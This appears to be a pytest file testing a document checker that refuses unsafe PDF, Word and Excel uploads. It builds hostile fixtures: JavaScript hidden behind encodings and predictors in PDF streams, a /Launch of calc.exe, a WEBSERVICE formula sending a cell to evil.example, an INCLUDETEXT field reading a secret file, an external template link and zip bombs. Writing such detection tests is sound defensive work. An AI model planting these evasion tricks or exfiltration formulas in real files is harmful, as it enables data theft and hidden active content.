"""0.12.0: what the workshop's file checks missed. A malformed Office file escaped the checks (and its run went
unrecorded); JavaScript hid in PDF streams Ember didn't decode; an /OpenAction could open a web address; a WEBSERVICE
formula hid in an Excel name; web queries and data connections passed; a Word field split over two runs passed.

Also tests from 0.15.0 (formerly test_fixes_0140_factory.py)."""

from __future__ import annotations

import base64
import io
import json
import struct
import tracemalloc
import warnings
import zipfile
import zlib
from pathlib import Path

import pypdfium2
import pypdfium2.raw as pdfium_c
import pytest
from fpdf import FPDF
from openpyxl import Workbook
from PIL import Image

from app.agent import library, tools
from app.products import checks, images, make, sheets
from tests.owner.test_owner_loop import owner
from tests.products.test_pictures import three_sheets
from tests.products.test_product_tools import ctx_for, make_agent
from tests.tools.test_workshop import a_docx, a_pdf, with_parts

WORD = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'


def a_pdf_with(body: bytes) -> bytes:
    return b"%PDF-1.5\n" + body + b"\ntrailer << /Root 1 0 R >>\n%%EOF"


def stream(dictionary: bytes, data: bytes, number: int = 2) -> bytes:
    return b"%d 0 obj << %s /Length %d >>\nstream\n%s\nendstream\nendobj\n" % (number, dictionary, len(data), data)


def test_a_real_pdf_with_links_pictures_and_an_opening_view_is_kept() -> None:
    data = a_pdf()
    assert b"/OpenAction [" in data and checks.check("page.pdf", data) == data
    photo = io.BytesIO()
    Image.new("RGB", (40, 30), (200, 80, 20)).save(photo, "JPEG")
    document = FPDF()
    document.add_page()
    document.set_font("helvetica", size=12)
    document.image(io.BytesIO(photo.getvalue()), x=10, y=10, w=40)
    document.cell(text="A shop", link="https://example.org")
    made = bytes(document.output())
    assert b"/DCTDecode" in made and checks.check("photo.pdf", made) == made  # a picture's stream isn't decoded


def test_javascript_hidden_behind_an_encoding_is_found() -> None:
    hidden = base64.a85encode(zlib.compress(b"<< /S /JavaScript /JS (app.alert(1)) >>")) + b"~>"
    body = stream(b"/Type /ObjStm /Filter [/ASCII85Decode /FlateDecode]", hidden)
    with pytest.raises(checks.Refused, match="active content"):
        checks.check("page.pdf", a_pdf_with(body))
    hexed = zlib.compress(b"<< /S /Launch /F (calc.exe) >>").hex().encode() + b">"
    with pytest.raises(checks.Refused, match="active content"):
        checks.check("page.pdf", a_pdf_with(stream(b"/Filter [/AHx /Fl]", hexed)))


@pytest.mark.parametrize(
    ("body", "message"),
    [
        (stream(b"/Filter /LZWDecode", b"\x80\x0b\x60\x50"), "encoded with LZWDecode, which Ember can't check"),
        (stream(b"/Filter /FlateDecode", b"not compressed at all"), "doesn't decode"),
        (stream(b"/Filter /DCTDecode", b"\xff\xd8 not a picture object"), "encoded with DCTDecode"),
        (b"1 0 obj << /Type /Catalog /Encrypt 5 0 R >> endobj", "encrypted"),
        (
            b"1 0 obj << /Type /Catalog /OpenAction << /S /URI /URI (https://tracker.example) >> >> endobj",
            "does something when it opens",
        ),
        (
            b"1 0 obj << /Type /Catalog /OpenAction 5 0 R >> endobj\n5 0 obj << /S /URI /URI (https://x.example) >>"
            b" endobj",
            "does something when it opens",
        ),
        (b"1 0 obj << /Type /Catalog /OpenAction 9 0 R >> endobj", "does something when it opens"),
        (b"3 0 obj << /Type /Annot /A << /S /URI /URI (javascript:alert(1)) >> >> endobj", "web or mail link"),
        (b"3 0 obj << /A << /S /URI /URI <6a6176617363726970743a> >> >> endobj", "web or mail link"),
    ],
)
def test_pdfs_that_hide_or_start_something_are_refused(body: bytes, message: str) -> None:
    with pytest.raises(checks.Refused, match=message):
        checks.check("page.pdf", a_pdf_with(body))


def test_an_opening_that_only_shows_a_page_passes_the_action_check() -> None:
    for body in (
        b"1 0 obj << /Type /Catalog /OpenAction [3 0 R /Fit] >> endobj",
        b"1 0 obj << /Type /Catalog /OpenAction 5 0 R >> endobj\n5 0 obj [3 0 R /FitH null] endobj",
        b"1 0 obj << /Type /Catalog /OpenAction << /S /GoTo /D [3 0 R /Fit] >> >> endobj",
    ):
        with pytest.raises(checks.Refused, match="can't be opened"):  # these bare files have no pages: past the check
            checks.check("page.pdf", a_pdf_with(body))


def test_a_word_field_split_over_runs_is_read_whole() -> None:
    split = (
        f"<w:document {WORD}><w:body><w:p>"
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText>INCLUDE</w:instrText></w:r><w:r><w:instrText>TEXT "c:\\\\secret.txt"</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>text</w:t></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
        "</w:p></w:body></w:document>"
    )
    with pytest.raises(checks.Refused, match="pulls in other files or programs"):
        checks.check("letter.docx", with_parts(a_docx(), {"word/document.xml": split}))
    nested = split.replace(  # the code built from a nested field's result
        "<w:r><w:instrText>INCLUDE</w:instrText></w:r>",
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>QUOTE "x"</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>INCLUDE</w:t></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>',
    )
    with pytest.raises(checks.Refused, match="pulls in other files or programs"):
        checks.check("letter.docx", with_parts(a_docx(), {"word/document.xml": nested}))


def a_workbook() -> bytes:
    book = Workbook()
    book.active["A1"] = "=SUM(B1:B3)"
    out = io.BytesIO()
    book.save(out)
    return out.getvalue()


def test_excel_names_connections_and_web_queries_are_refused() -> None:
    clean = a_workbook()
    assert checks.check("budget.xlsx", clean) == clean
    with zipfile.ZipFile(io.BytesIO(clean)) as archive:
        workbook = archive.read("xl/workbook.xml").decode()
    named = workbook.replace(
        "</workbook>",
        '<definedNames><definedName name="leak">WEBSERVICE("https://evil.example/?"&amp;Sheet!A1)</definedName>'
        "</definedNames></workbook>",
    )
    with pytest.raises(checks.Refused, match="a name that reaches outside the workbook"):
        checks.check("budget.xlsx", with_parts(clean, {"xl/workbook.xml": named}))
    for part in ("xl/connections.xml", "xl/queryTables/queryTable1.xml"):
        with pytest.raises(checks.Refused, match="macros, ActiveX, embedded objects or links to other files"):
            checks.check("budget.xlsx", with_parts(clean, {part: "<x/>"}))


def test_an_office_part_of_no_known_kind_is_refused() -> None:
    with pytest.raises(checks.Refused, match=r"word/tool\.bin \(of no known kind\)"):
        checks.check("letter.docx", with_parts(a_docx(), {"word/tool.bin": b"MZ\x90\x00"}))
    with zipfile.ZipFile(io.BytesIO(a_docx())) as archive:
        types = archive.read("[Content_Types].xml").decode()
    script = '<Override PartName="/word/app.js" ContentType="application/javascript"/></Types>'
    parts = {"[Content_Types].xml": types.replace("</Types>", script), "word/app.js": "alert(1)"}
    with pytest.raises(checks.Refused, match=r"word/app\.js \(application/javascript\)"):
        checks.check("letter.docx", with_parts(a_docx(), parts))


def test_a_file_that_cannot_be_read_whole_is_refused_not_an_error() -> None:
    data = bytearray(a_docx())
    with zipfile.ZipFile(io.BytesIO(bytes(data))) as archive:
        part = archive.getinfo("word/document.xml")
    start = part.header_offset + 30 + len(part.filename.encode()) + len(part.extra) + 10
    data[start : start + 20] = b"\x00" * 20  # corrupt the compressed document
    with pytest.raises(checks.Refused, match=r"the \.docx file can't be read whole"):
        checks.check("letter.docx", bytes(data))


def a_page(width: float, height: float) -> bytes:
    document = FPDF(unit="pt", format=(width, height))
    document.add_page()
    document.set_font("helvetica", size=6)
    document.text(2, min(height, 12) - 2, "x")
    return bytes(document.output())


@pytest.mark.parametrize(
    ("width", "height", "kept"),
    [(144, 576, True), (595, 842, True), (1000, 10, False), (14_401, 600, False), (10, 10, False), (2000, 99, False)],
)
def test_a_page_no_printer_or_screen_shows_is_refused(width: float, height: float, kept: bool) -> None:
    """0.21.0: a workshop PDF 1000 x 10 points wide was kept, and one listing photo of it took 27.5 s and 3.9 GB."""
    data = a_page(width, height)
    if kept:
        assert checks.check("page.pdf", data) == data
    else:
        with pytest.raises(checks.Refused, match=r"page 1 is .* points: a page must be 18 to 14400 points"):
            checks.check("page.pdf", data)


def test_a_page_is_never_drawn_larger_than_the_pixel_limit(monkeypatch: pytest.MonkeyPatch) -> None:
    """0.21.0: the scale came from the page's height alone, so a wide page was drawn as wide as that made it."""
    monkeypatch.setattr(images, "MAX_PIXELS", 1_000_000)
    [wide] = images.pdf_pages(a_page(1000, 10), [1], height=2_250)
    assert wide.width * wide.height <= 1_000_000 and wide.width > 20 * wide.height
    [normal] = images.pdf_pages(a_page(595, 842), [1], height=1_000)
    assert normal.height == 1_000


# --- From 0.15.0 (formerly test_fixes_0140_factory.py) ---


# --- FIX NOW 22: the workshop's PDF check ----------------------------------------------------------------------


def objects_in_a_stream(
    filter_value: bytes = b"/FlateDecode",
    line_end: bytes = b"\n",
    script: bool = True,
    *,
    named: bool = True,
    extra: bytes = b"",
    keyword: bytes = b">>\nstream",
    parms: bytes = b"",
) -> bytes:
    """A one-page PDF whose catalog and pages (and with ``script``, a JavaScript action it runs when it opens, also
    ``named`` in the catalog's names) sit in a compressed object stream, found through a cross-reference stream whose
    rows are PNG-predicted. ``extra`` goes into the object stream's dictionary before its /Filter; with ``parms`` (its
    /DecodeParms), its content is in PNG 'sub' rows of 8 columns."""
    objects = {
        1: b"<< /Type /Catalog /Pages 2 0 R"
        + (b" /OpenAction 4 0 R" if script else b"")
        + (b" /Names << /JavaScript 5 0 R >>" if script and named else b"")
        + b" >>",
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>",
        4: b"<< /S /JavaScript /JS (app.alert\\(1\\)) >>" if script else b"<< /Kind /Nothing >>",
        5: b"<< /Names [(a) 4 0 R] >>" if script else b"<< >>",
    }
    offsets, body = [], b""
    for number, text in objects.items():
        offsets.append(b"%d %d" % (number, len(body)))
        body += text + b"\n"
    head = b" ".join(offsets) + b"\n"
    packed = zlib.compress(predicted(head + body) if parms else head + body)
    out = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
    at = {6: len(out)}
    out += b"6 0 obj\n<< /Type /ObjStm /N 5 /First %d /Length %d " % (len(head), len(packed))
    out += extra + b"/Filter " + filter_value + parms + b" " + keyword + line_end + packed + b"\nendstream\nendobj\n"
    at[9] = len(out)
    out += b"9 0 obj\n/FlateDecode\nendobj\n"
    at[10] = len(out)
    rows = [b"\x00" + bytes(4) + b"\xff\xff"]
    rows += [b"\x02" + struct.pack(">IH", 6, n) for n in range(5)]
    rows += [b"\x01" + struct.pack(">IH", at[6], 0), b"\x00" * 7, b"\x00" * 7]
    rows += [b"\x01" + struct.pack(">IH", at[9], 0), b"\x01" + struct.pack(">IH", at[10], 0)]
    up, previous = b"", bytes(7)
    for row in rows:  # PNG "up" rows, as qpdf and others write them
        up += b"\x02" + bytes((a - b) & 255 for a, b in zip(row, previous, strict=True))
        previous = row
    xref = zlib.compress(up)
    out += (
        b"10 0 obj\n<< /Type /XRef /Size 11 /W [1 4 2] /Root 1 0 R /Filter /FlateDecode "
        b"/DecodeParms << /Columns 7 /Predictor 12 >> /Length %d >>\nstream\n" % len(xref)
    )
    out += xref + b"\nendstream\nendobj\nstartxref\n%d\n%%%%EOF\n" % at[10]
    return out


def scripts_in(data: bytes) -> int:
    document = pypdfium2.PdfDocument(data)
    try:
        assert len(document) == 1
        return pdfium_c.FPDFDoc_GetJavaScriptActionCount(document.raw)
    finally:
        document.close()


@pytest.mark.parametrize(
    ("filter_value", "line_end"),
    [(b"9 0 R", b"\n"), (b"[9 0 R]", b"\n"), (b"/FlateDecode", b"\r"), (b"/Fl#61teDecode", b"\r")],
)
def test_javascript_in_an_object_stream_is_found_however_it_is_written(filter_value: bytes, line_end: bytes) -> None:
    data = objects_in_a_stream(filter_value, line_end)
    assert scripts_in(data) == 1  # a viewer runs it
    with pytest.raises(checks.Refused, match="active content|names a stream's encoding in a way Ember can't check"):
        checks.check("guide.pdf", data)


def predicted(text: bytes, columns: int = 8) -> bytes:
    """``text`` in PNG 'sub' rows: each byte less the one before it, so no name shows in the bytes."""
    text += b" " * (-len(text) % columns)
    rows = b""
    for at in range(0, len(text), columns):
        row = text[at : at + columns]
        rows += b"\x01" + bytes((row[i] - (row[i - 1] if i else 0)) & 255 for i in range(columns))
    return rows


SCRIPT = b"<< /S /JavaScript /JS (app.alert(1)) >>"


@pytest.mark.parametrize(
    "body",
    [
        stream(
            b"/Type /ObjStm /Filter /FlateDecode /DecodeParms << /Predictor 11 /Columns 8 >>",
            zlib.compress(predicted(SCRIPT)),
        ),
        stream(b"/Subtype /Image /Filter [/FlateDecode /DCTDecode]", zlib.compress(SCRIPT)),
    ],
)
def test_javascript_behind_a_predictor_or_a_picture_encoding_is_found(body: bytes) -> None:
    with pytest.raises(checks.Refused, match="active content"):
        checks.check("page.pdf", a_pdf_with(body))


@pytest.mark.parametrize("extra", [b"/E /stream ", b"/E (stream) ", b"/E (>> stream) "])
def test_a_false_stream_keyword_on_the_keywords_line_hides_nothing(extra: bytes) -> None:
    data = objects_in_a_stream(named=False, extra=extra, keyword=b">> stream")
    assert scripts_in(data) == 0  # pdfium reads the object stream, and counts no named script to stop it
    with pytest.raises(checks.Refused, match="active content"):
        checks.check("guide.pdf", data)


@pytest.mark.parametrize(
    "parms",
    [
        b"<< /Predictor 1 /Predictor 11 /Columns 8 >>",  # pdfium reads the last of two
        b"<< /Predictor 11 /Columns 1 /Columns 8 >>",
        b"<< /Predictor 11.0 /Columns 8 >>",
    ],
)
def test_a_predictor_named_twice_or_oddly_is_refused(parms: bytes) -> None:
    data = objects_in_a_stream(named=False, parms=b" /DecodeParms " + parms)
    assert scripts_in(data) == 0
    with pytest.raises(checks.Refused, match="decoding parameters in a way Ember can't check"):
        checks.check("guide.pdf", data)
    clean = objects_in_a_stream(script=False, parms=b" /DecodeParms << /Predictor 11 /Columns 8 >>")
    assert scripts_in(clean) == 0 and checks.check("guide.pdf", clean) == clean


def test_a_clean_pdf_with_object_streams_is_kept() -> None:
    data = objects_in_a_stream(script=False)
    assert scripts_in(data) == 0 and checks.check("guide.pdf", data) == data
    parms = data.replace(b"/FlateDecode >>\nstream", b"/FlateDecode /DecodeParms 9 0 R >>\nstream", 1)
    with pytest.raises(checks.Refused, match="names a stream's decoding parameters in a way Ember can't check"):
        checks.check("guide.pdf", parms)


# --- FIX NOW 26: Office files that unpack to too much, or don't read -------------------------------------------


def lying_about(data: bytes, name: str, size: int) -> bytes:
    """A zip whose central directory says ``name`` unpacks to ``size`` bytes."""
    out = bytearray(data)
    at = out.find(b"PK\x01\x02")
    while at >= 0:
        length = struct.unpack("<H", out[at + 28 : at + 30])[0]
        if out[at + 46 : at + 46 + length] == name.encode():
            out[at + 24 : at + 28] = struct.pack("<I", size)
        at = out.find(b"PK\x01\x02", at + 4)
    return bytes(out)


def test_a_word_bomb_is_refused_before_it_is_unpacked() -> None:
    bomb = with_parts(a_docx(), {"word/document.xml": b" " * 60_000_000})
    assert len(bomb) < 200_000
    with pytest.raises(library.LibraryError, match="this Word file can't be read: it unpacks to too much data"):
        library.from_file("guide.docx", bomb)
    small = with_parts(a_docx(), {"word/media/x.xml": b" " * 30_000_000})
    liar = lying_about(small, "word/media/x.xml", 1_000)
    tracemalloc.start()
    try:
        with pytest.raises(library.LibraryError, match="this Word file can't be read: it can't be read whole"):
            library.from_file("guide.docx", liar)
        peak = tracemalloc.get_traced_memory()[1]
    finally:
        tracemalloc.stop()
    assert peak < 10_000_000  # zipfile's read() unpacked all 30 MB before it cut the part to the size it declared


def test_a_malformed_word_file_is_a_clear_refusal_not_an_error(data_dir: Path) -> None:
    agent, _ = make_agent(data_dir, [])
    broken = with_parts(a_docx(), {"word/document.xml": "<w:document><unclosed"})
    reply = owner(agent).add_document(
        {"file_name": "notes.docx", "file_data": base64.b64encode(broken).decode()}, "Owner"
    )
    assert reply.status == 422 and "this Word file can't be read" in json.dumps(reply.body)


def test_an_excel_bomb_is_refused_where_the_agent_reads_or_shows_it(data_dir: Path) -> None:
    agent, _ = make_agent(data_dir, [])
    ctx = ctx_for(agent)
    ws = ctx.workspace
    three_sheets(ws)
    make.spreadsheet(ws, "b.json", "shop/b.xlsx")
    ws.write_bytes("shop/bomb.xlsx", with_parts(ws.read_bytes("shop/b.xlsx"), {"xl/x.xml": b" " * 60_000_000}))
    with pytest.raises(tools.ToolError, match=r"shop/bomb\.xlsx can't be read: the Excel file unpacks to too much"):
        tools.HANDLERS["workspace_read"](ctx, {"path": "shop/bomb.xlsx"}, None)
    with pytest.raises(make.ProductError, match="unpacks to too much data"):
        make.image(ws, "shop/photo.png", "shop/bomb.xlsx#1", "Title")
    with pytest.raises(sheets.SheetError, match="can't be read"):
        sheets.workbook_text(zipfile_of({"[Content_Types].xml": b"<Types/>"}))


def zipfile_of(parts: dict[str, bytes]) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as archive:
        for name, data in parts.items():
            archive.writestr(name, data)
    return out.getvalue()


def test_an_office_file_holding_a_part_twice_is_refused() -> None:
    rels = "word/_rels/document.xml.rels"
    template = (
        b'<Relationship Id="rId99" Target="file:///C:/evil.dotm" TargetMode="External" Type="http://schemas.'
        b'openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"/></Relationships>'
    )
    out = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(a_docx())) as source, zipfile.ZipFile(out, "w") as copy, warnings.catch_warnings():
        warnings.simplefilter("ignore")  # zipfile warns of a name it already has
        for part in source.infolist():
            data = source.read(part)
            if part.filename == rels:  # a linked template first, then the clean part under the same name
                copy.writestr(rels, data.replace(b"</Relationships>", template))
            copy.writestr(part, data)
    with pytest.raises(checks.Refused, match="holds a part twice"):
        checks.check("letter.docx", out.getvalue())
